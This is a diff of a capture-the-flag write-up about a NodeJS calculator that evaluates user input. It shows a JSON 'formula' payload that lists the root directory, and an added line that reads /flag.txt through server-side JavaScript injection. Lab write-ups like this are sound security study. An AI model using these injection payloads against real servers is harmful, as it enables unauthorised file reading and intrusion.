@@ -23,7 +23,10 @@ On the backend of the NodeJS application, we can see the vulnerable code using e
 {
 "formula":"require('fs').readdirSync('/','')"
 }
+
+require('fs').readFileSync('/flag.txt').toString()
 ```
+
 
 ## Exploit
 <img src= "jscalc_exploit.PNG">
